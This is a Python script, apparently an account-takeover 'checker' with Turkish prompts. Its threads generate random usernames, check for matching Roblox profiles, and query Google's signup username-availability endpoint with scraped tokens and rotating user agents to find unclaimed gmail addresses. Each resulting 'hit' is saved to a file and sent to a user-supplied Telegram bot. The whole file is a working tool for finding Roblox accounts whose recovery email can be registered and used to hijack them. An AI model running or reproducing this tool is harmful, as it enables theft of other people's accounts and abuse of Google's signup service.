import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from cfonts import render
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

init(autoreset=True)

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
CONTENT_TYPE_HEADER = 'Content-Type'
USER_AGENT_HEADER = 'User-Agent'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
TOKEN_FILE = 'tl.txt'
GMAIL_DOMAIN = '@gmail.com'

E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Y = '\033[1;34m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
A = '\033[2;34m'
S = '\033[2;36m'
G = '\033[1;34m'
O = '\x1b[38;5;208m'

total_hits = 0
hits = 0
bad_roblox = 0
bad_email = 0
good_roblox = 0
roblox_info = {}

header = render('Roblox', colors=['white', 'blue'], align='center')
print("\x1b[1;36m" * 67)
print(header)
print("\x1b[1;36m" * 67)

ID = input(" İD gir: ")
TOKEN = input("Bot Token gir: ")

os.system('clear')
print("\x1b[1;36m" * 67)
print(header)
print("\x1b[1;36m" * 67)

def pppp():
    ge = hits               
    bt = bad_roblox + bad_email 
    be = good_roblox          
    print(f"\r          {B}  {C1}Hit Roblox: {M}{ge}  {E}Bad: {M}{bt}  {W9} Good{M}{be}    {R} \r", end='')

def update_stats():
    pppp()

def generate_token():
    try:
        alphabet = string.ascii_lowercase
        n1 = ''.join(random.choice(alphabet) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(alphabet) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(alphabet) for _ in range(random.randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=tr"
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"TR",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
            cookies=cookies,
            headers=headers2,
            data=data
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(f"Token üretim hatası: {e}")
        generate_token()

generate_token()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22TR%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            update_stats()
            full_email = email + GMAIL_DOMAIN
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check_roblox(email):
    global good_roblox, bad_roblox
    try:
        username = email.split('@')[0]
        headers = {
            USER_AGENT_HEADER: generate_user_agent(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'tr-TR,tr;q=0.9',
        }
        response = requests.get(f"https://www.roblox.com/users/profile?username={username}", headers=headers)
        if response.status_code == 200 and "Roblox" in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            profile_check = soup.find('div', class_='profile-container')
            if profile_check:
                roblox_info[username] = {
                    'username': username
                }
                good_roblox += 1
                update_stats()
                check_gmail(email)
            else:
                bad_roblox += 1
                update_stats()
        else:
            bad_roblox += 1
            update_stats()
    except Exception as e:
        print(f"Kullanıcı adı kontrol hatası: {e}")
        bad_roblox += 1
        update_stats()

def generate_username():
    length = random.randint(7, 9)
    chars = string.ascii_lowercase
    username = ''.join(random.choice(chars) for _ in range(length))
    return username

def InfoAcc(username, domain):
    global total_hits
    account_info = roblox_info.get(username, {})
    reset_email = username + GMAIL_DOMAIN
    total_hits += 1
    info_text = f"""


𝙍𝙤𝙗𝙡𝙤𝙭 
𝙆𝙪𝙡𝙡𝙖𝙣𝙘ı 𝙖𝙙ı:  @{username}
𝙂𝙢𝙖𝙞𝙡: {reset_email}
 𝙇𝙞𝙣𝙠: https://www.roblox.com/users/profile?username={username}
"""
    with open('RobloxHits.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

def roblox_loop():
    while True:
        try:
            username = generate_username()
            email = username + GMAIL_DOMAIN
            check_roblox(email)
        except Exception:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()

for _ in range(12):
    Thread(target=roblox_loop).start()